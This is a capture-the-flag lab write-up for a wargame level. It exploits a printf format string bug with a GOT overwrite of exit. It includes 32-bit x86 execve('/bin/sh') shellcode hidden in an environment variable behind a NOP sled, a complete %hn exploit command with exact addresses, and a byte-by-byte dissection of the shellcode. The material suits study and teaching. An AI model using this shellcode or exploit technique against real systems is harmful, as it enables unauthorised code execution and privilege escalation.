RELRO                STACK CANARY        NX                   PIE             RPATH        RUNPATH         FILE
No RELRO 🔴     No canary found 🔴   NX disabled 🔴      No PIE 🔴       No RPATH 🟢   No RUNPATH 🟢   /home/users/level05/level05
-----
This level is one of the most elegant memory-corruption techniques: **GOT Overwrite**.

Below is a detailed log to keep as study material.

---

# 📒 EXPLOITATION LOG: LEVEL 05 @ OVERRIDE

## 1. Reconnaissance

* **Checksec:**
* **No RELRO 🔴**: The fatal weakness — it lets us overwrite the function address
  table (GOT).
* **NX disabled 🔴**: The stack/memory can execute code.
* **No Canary 🔴**: No guard protecting control flow.


* **Source (Ghidra):**
* There is a loop that automatically lowercases input by XORing with `0x20`. If
  we place shellcode directly in the input buffer, it gets corrupted.
* Main vulnerability: **`printf(local_78);`** — a classic **Format String** bug.

---

## 2. Strategy: GOT Overwrite + Environment Variable

Because the program ends with `exit(0)`, we "swap out" the address of `exit` in
the **GOT (Global Offset Table)** so it points straight at our shellcode.

### Why use an environment variable?

The program lowercases characters (`tolower`), so shellcode typed through `fgets`
would have its machine-code bytes altered and wouldn't run. Environment variables
sit high on the stack and are completely unaffected by the program's logic.

---

## 3. Execution Steps

### Step 1: Hide the shellcode

Create an environment variable named `SHELLCODE` holding 1000 NOP bytes (`\x90`)
as a "slide" to raise the success rate of the jump.

```bash
export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

```

### Step 2: Find the target addresses

1. **Where to write:** `objdump -R ./level05 | grep exit`. Result: `0x080497e0`.
2. **What to write:** The address of `SHELLCODE` on the stack. From
   calculation/GDB, pick a point in the middle of the NOP slide: `0xffffd888`.

### Step 3: Compute the Format String payload

Use the **half-write (`%hn`)** technique to write 2 bytes at a time, keeping the
program stable.

* Write `0xd888` (decimal: 55432) into address `0x080497e0`.
* Write `0xffff` (decimal: 65535) into address `0x080497e2`.

**Payload math:**

1. **Address bytes:** 2 addresses (4 bytes each) = **8 characters**.
2. **First chunk print:** $55432 - 8 = \mathbf{55424}$.
3. **Second chunk print:** $65535 - 55432 = \mathbf{10103}$.
4. **Offset:** Our data starts at stack position **10**.

---

## 4. Final exploit command

```bash
(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55424d" + "%10$hn" + "%10103d" + "%11$hn"'; cat) | ./level05

```

**How it works:**

1. `printf` is called and prints tens of thousands of spaces to reach the desired
   character count.
2. On `%hn` it writes the total number of printed characters into the
   corresponding GOT entry.
3. When `exit(0)` runs, instead of exiting, the CPU consults the GOT and jumps
   straight to `0xffffd888`.
4. The CPU "slides" through the NOPs and executes the shellcode, opening a shell.

---

## 5. Takeaways

* **What is RELRO?** It makes the GOT "read-only." Without RELRO, any library
  function entry can be swapped out.
* **Format String isn't only for reading:** With `%n`, it becomes an extremely
  powerful memory-write primitive.
* **The NOP sled matters:** When the target address can drift slightly, a large
  NOP sled is the "safety net" that catches the CPU's control flow.

------------------- "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" ------

This "Matrix code"-looking string is actually a classic **shellcode** for the
**Linux x86 (32-bit)** architecture.

Its sole purpose is to perform the syscall `execve("/bin/sh", NULL, NULL)` to open
a command shell.

Let's dissect it byte by byte to see what the CPU really does:

---

### 1. From hex to assembly (machine code)

The hex maps to the following assembly instructions:

| Byte (Hex) | Assembly | Simple explanation |
| --- | --- | --- |
| `\x31\xc0` | `xor eax, eax` | Clear the `eax` register (set it to 0). |
| `\x50` | `push eax` | Push 0 as the string terminator (`\0`). |
| `\x68\x2f\x2f\x73\x68` | `push 0x68732f2f` | Push `//sh` (reversed, little-endian). |
| `\x68\x2f\x62\x69\x6e` | `push 0x6e69622f` | Push `/bin`. Together we get `/bin//sh`. |
| `\x89\xe3` | `mov ebx, esp` | Put the address of the string into `ebx` (execve arg 1). |
| `\x50` | `push eax` | Push NULL (0) as `envp`. |
| `\x53` | `push ebx` | Push the `/bin/sh` address as `argv`. |
| `\x89\xe1` | `mov ecx, esp` | Put the address of the `argv` array into `ecx` (arg 2). |
| `\xb0\x0b` | `mov al, 0xb` | Set `eax` to **11** ($0x0b$), the `execve` syscall number. |
| `\xcd\x80` | `int 0x80` | "Knock on" the kernel to run the syscall. |

---

### 2. Why make it so complicated?

You might ask: *"Why not just write /bin/sh directly instead of pushing it in
pieces?"*

The answer lies in the constraints of memory-corruption attacks:

* **Avoid NULL bytes (`\x00`):** In C, a `00` byte terminates a string. If your
  shellcode contains `00`, functions like `gets()` or `strcpy()` stop reading and
  the shellcode is truncated. That's why we use `xor eax, eax` instead of
  `mov eax, 0`.
* **Position independence:** This shellcode doesn't depend on where it is in
  memory. It builds the `/bin/sh` string on the stack at runtime.
* **Filter bypass:** Using `/bin//sh` (double slash) instead of `/bin/sh` makes
  the string length a multiple of 4 bytes, which makes pushing onto the stack
  easier, and Linux still treats it as the correct path.

---

### 3. The syscall procedure (general principle)

To open a shell, this code must set up the "scene" for `execve` before calling
`int 0x80`:

1. **EAX:** Must hold the syscall number (`execve` is **11**).
2. **EBX:** Holds the address of the path string (`"/bin/sh"`).
3. **ECX:** Holds the address of the argument array (usually the address of that
   string plus a NULL).
4. **EDX:** Holds the address of the environment (usually left as 0/NULL).

### In short

This string is a "universal command" at the lowest level the CPU understands.
Put it in memory and force the CPU to jump into it, and the CPU stops running the
old program and opens a new shell with that program's privileges.

That's why in earlier labs, just leaking an address and pointing the CPU at this
string was enough to take control!
